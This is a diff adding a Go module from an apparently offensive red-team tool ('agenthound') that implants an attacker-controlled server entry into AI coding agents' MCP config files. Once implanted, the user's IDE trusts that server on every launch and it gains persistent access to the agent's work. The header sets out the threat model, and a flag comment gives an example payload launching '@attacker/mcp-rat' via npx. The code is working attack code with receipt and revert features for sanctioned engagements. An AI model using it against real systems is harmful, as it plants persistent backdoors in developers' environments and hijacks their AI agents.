@@ -1,0 +1,314 @@
+// Package mcpconfigimplant implements the v0.4 MCP-config Implanter.
+//
+// Threat model. AI-coding-agent clients (Cursor, Claude Code, VS Code,
+// Continue, …) read a JSON MCP config to learn which MCP servers to
+// trust. An attacker who can append a server entry to that config
+// makes the user's IDE auto-trust the attacker's MCP server on the
+// next launch. The MCP server then gets called by the agent during
+// normal use — full read/write access to whatever the agent does.
+//
+// Why an Implanter and not a Poisoner. The line is: Poisoner modifies
+// content the agent CONSUMES; Implanter installs PERSISTENCE. Adding a
+// new MCP server to the client's config is a textbook persistence
+// pattern — the client trusts the entry on every future launch
+// without operator action. This is why we ship it under
+// `agenthound implant`, distinct from `agenthound poison`.
+//
+// Sentinel-bracketed insertion via JSON-comment block. JSON does not
+// have comments, so we cannot use the same `<!--` sentinel as
+// instruction-files. Instead we prefix the implanted server's name
+// with a known marker (default "agenthound-implant-<engagement-id>")
+// and the receipt records the full key so revert can JSON-decode,
+// strip the keyed entry, and re-encode. Idempotency: revert is a
+// no-op if the keyed entry is already gone.
+package mcpconfigimplant
+
+import (
+	"context"
+	"crypto/sha256"
+	"encoding/hex"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"log/slog"
+	"os"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"github.com/spf13/pflag"
+
+	"github.com/adithyan-ak/agenthound/sdk/action"
+	"github.com/adithyan-ak/agenthound/sdk/module"
+)
+
+// MaxFileBytes caps the read-and-rewrite size. MCP configs are tiny
+// (~kilobytes); cap at 1 MiB defensively.
+const MaxFileBytes int64 = 1 << 20
+
+// Implanter is the registered module.
+type Implanter struct {
+	stateful module.StatefulModule
+}
+
+func New() *Implanter {
+	return &Implanter{stateful: module.NewFileStatefulModule("mcp.config.implant")}
+}
+
+func (i *Implanter) Stateful() module.StatefulModule { return i.stateful }
+func (i *Implanter) SetStateful(s module.StatefulModule) {
+	i.stateful = s
+}
+
+// RegisterFlags satisfies module.FlagsModule. The implant CLI provides
+// --target-id (the absolute config path) and --inject (a JSON block
+// describing the malicious server, e.g.
+// {"command":"npx","args":["-y","@attacker/mcp-rat"]}).
+//
+// --servers-key gives operators an escape hatch when the target client
+// uses a non-standard top-level key (VS Code uses `servers`, Zed uses
+// `context_servers`, Windsurf uses `mcpServers` with `serverUrl`
+// child shape). Default is `mcpServers` (Claude Desktop, Cursor,
+// Claude Code, Cline).
+func (i *Implanter) RegisterFlags(fs *pflag.FlagSet) {
+	fs.String("file", "", "Absolute path to the MCP config JSON (.cursor/mcp.json, etc.). Required.")
+	fs.String("server-name", "", "Name to use for the implanted server entry. Defaults to agenthound-implant-<engagement-id>.")
+	fs.String("servers-key", "mcpServers",
+		"Top-level key in the JSON that holds the server map. Override for VS Code (servers), Zed (context_servers).")
+}
+
+// Implant decodes the MCP config JSON, inserts a server entry under
+// the configured name, and atomically writes the file back.
+func (i *Implanter) Implant(ctx context.Context, t action.Target, payload action.ImplantPayload) (*action.ImplantReceipt, error) {
+	path, _ := payload.Extras["file"].(string)
+	path = strings.TrimSpace(path)
+	if path == "" {
+		path = strings.TrimSpace(payload.TargetID)
+	}
+	if path == "" {
+		return nil, errors.New("mcp config implant: --file <abs-path> is required")
+	}
+	if !filepath.IsAbs(path) {
+		return nil, fmt.Errorf("mcp config implant: --file %q must be an absolute path", path)
+	}
+	if payload.InjectionContent == "" {
+		return nil, errors.New("mcp config implant: --inject (JSON object describing server) is required")
+	}
+	engagementID := payload.EngagementID
+	if engagementID == "" {
+		return nil, errors.New("mcp config implant: --engagement-id is required")
+	}
+	serversKey, _ := payload.Extras["servers-key"].(string)
+	if serversKey == "" {
+		serversKey = "mcpServers"
+	}
+	serverName, _ := payload.Extras["server-name"].(string)
+	if serverName == "" {
+		serverName = "agenthound-implant-" + engagementID
+	}
+
+	var serverEntry map[string]any
+	if err := json.Unmarshal([]byte(payload.InjectionContent), &serverEntry); err != nil {
+		return nil, fmt.Errorf("mcp config implant: --inject must be a JSON object: %w", err)
+	}
+
+	original, preHash, err := readFileBounded(path)
+	if err != nil {
+		return nil, fmt.Errorf("read target file: %w", err)
+	}
+
+	configMap := map[string]any{}
+	if len(original) > 0 {
+		if err := json.Unmarshal([]byte(original), &configMap); err != nil {
+			return nil, fmt.Errorf("decode existing JSON config: %w", err)
+		}
+	}
+
+	serversRaw, ok := configMap[serversKey]
+	if !ok || serversRaw == nil {
+		configMap[serversKey] = map[string]any{}
+		serversRaw = configMap[serversKey]
+	}
+	servers, ok := serversRaw.(map[string]any)
+	if !ok {
+		return nil, fmt.Errorf("config %q at key %q is not an object (got %T) — refusing to clobber", path, serversKey, serversRaw)
+	}
+	priorEntryWasPresent := false
+	if _, exists := servers[serverName]; exists {
+		priorEntryWasPresent = true
+	}
+	servers[serverName] = serverEntry
+	configMap[serversKey] = servers
+
+	final, err := json.MarshalIndent(configMap, "", "  ")
+	if err != nil {
+		return nil, fmt.Errorf("encode implanted JSON: %w", err)
+	}
+	final = append(final, '\n')
+	postHash := sha256Hex(final)
+
+	receipt := &action.ImplantReceipt{
+		ModuleID:         "mcp.config.implant",
+		EngagementID:     engagementID,
+		Target:           t,
+		TargetID:         path,
+		InjectionContent: payload.InjectionContent,
+		PreSHA256:        preHash,
+		PostSHA256:       postHash,
+		AppliedAt:        time.Now().UTC(),
+		DryRun:           payload.DryRun,
+		Extra: map[string]any{
+			"file":                    path,
+			"servers_key":             serversKey,
+			"server_name":             serverName,
+			"prior_entry_was_present": priorEntryWasPresent,
+		},
+	}
+
+	if payload.DryRun {
+		slog.Info("mcp config implant dry-run",
+			"file", path,
+			"engagement_id", engagementID,
+			"server_name", serverName)
+		return receipt, nil
+	}
+
+	if _, err := i.stateful.WriteReceipt(engagementID, receipt); err != nil {
+		return nil, fmt.Errorf("persist receipt before mutation: %w", err)
+	}
+
+	if err := writeFileAtomic(path, final); err != nil {
+		return nil, fmt.Errorf("write implanted file: %w", err)
+	}
+	slog.Info("mcp config implant applied",
+		"file", path,
+		"engagement_id", engagementID,
+		"server_name", serverName,
+		"servers_key", serversKey)
+	return receipt, nil
+}
+
+// Revert decodes the config, drops the implanted server entry, and
+// writes the file back. Idempotent: if the entry is already absent,
+// Revert is a no-op.
+func (i *Implanter) Revert(ctx context.Context, receipt action.Receipt) error {
+	r, ok := normalizeReceipt(receipt)
+	if !ok {
+		return fmt.Errorf("mcp config implant revert: unexpected receipt type %T", receipt)
+	}
+	if r.DryRun {
+		return nil
+	}
+	path, _ := r.Extra["file"].(string)
+	serversKey, _ := r.Extra["servers_key"].(string)
+	serverName, _ := r.Extra["server_name"].(string)
+	priorWasPresent, _ := r.Extra["prior_entry_was_present"].(bool)
+	if path == "" || serversKey == "" || serverName == "" {
+		return errors.New("mcp config implant revert: receipt missing path / servers_key / server_name")
+	}
+
+	current, _, err := readFileBounded(path)
+	if err != nil {
+		return fmt.Errorf("read target file: %w", err)
+	}
+	if current == "" {
+		// File no longer exists. Nothing to revert.
+		return nil
+	}
+	configMap := map[string]any{}
+	if err := json.Unmarshal([]byte(current), &configMap); err != nil {
+		return fmt.Errorf("decode current JSON: %w", err)
+	}
+	serversRaw, ok := configMap[serversKey]
+	if !ok {
+		return nil
+	}
+	servers, ok := serversRaw.(map[string]any)
+	if !ok {
+		return nil
+	}
+	if _, exists := servers[serverName]; !exists {
+		// Already reverted out-of-band.
+		return nil
+	}
+	if priorWasPresent {
+		// Defensive: the operator implanted on top of an existing entry
+		// of the same name. Without the original entry preserved on the
+		// receipt we cannot restore it. Surface as an error so the
+		// operator can resolve manually rather than silently destroying
+		// pre-existing legitimate state.
+		return fmt.Errorf("mcp config implant revert: receipt indicates prior entry existed for %q — refusing to delete (manual revert required)", serverName)
+	}
+	delete(servers, serverName)
+	configMap[serversKey] = servers
+
+	final, err := json.MarshalIndent(configMap, "", "  ")
+	if err != nil {
+		return fmt.Errorf("encode reverted JSON: %w", err)
+	}
+	final = append(final, '\n')
+	if err := writeFileAtomic(path, final); err != nil {
+		return fmt.Errorf("write reverted file: %w", err)
+	}
+	slog.Info("mcp config implant reverted",
+		"file", path,
+		"engagement_id", r.EngagementID,
+		"server_name", serverName)
+	return nil
+}
+
+func readFileBounded(path string) (string, string, error) {
+	f, err := os.Open(path)
+	if err != nil {
+		if os.IsNotExist(err) {
+			return "", "", nil
+		}
+		return "", "", err
+	}
+	defer func() { _ = f.Close() }()
+	st, err := f.Stat()
+	if err != nil {
+		return "", "", err
+	}
+	if st.Size() > MaxFileBytes {
+		return "", "", fmt.Errorf("file %q too large (%d bytes; cap %d)", path, st.Size(), MaxFileBytes)
+	}
+	data := make([]byte, st.Size())
+	if _, err := f.Read(data); err != nil && err.Error() != "EOF" {
+		return "", "", err
+	}
+	return string(data), sha256Hex(data), nil
+}
+
+func writeFileAtomic(path string, data []byte) error {
+	dir := filepath.Dir(path)
+	if dir != "" {
+		_ = os.MkdirAll(dir, 0o700)
+	}
+	tmp := path + ".tmp.agenthound"
+	if err := os.WriteFile(tmp, data, 0o600); err != nil {
+		return err
+	}
+	if err := os.Rename(tmp, path); err != nil {
+		_ = os.Remove(tmp)
+		return err
+	}
+	return nil
+}
+
+func sha256Hex(b []byte) string {
+	h := sha256.Sum256(b)
+	return hex.EncodeToString(h[:])
+}
+
+func normalizeReceipt(r action.Receipt) (*action.ImplantReceipt, bool) {
+	switch v := r.(type) {
+	case *action.ImplantReceipt:
+		return v, true
+	case action.ImplantReceipt:
+		return &v, true
+	}
+	return nil, false
+}
+
+var _ action.Implanter = (*Implanter)(nil)
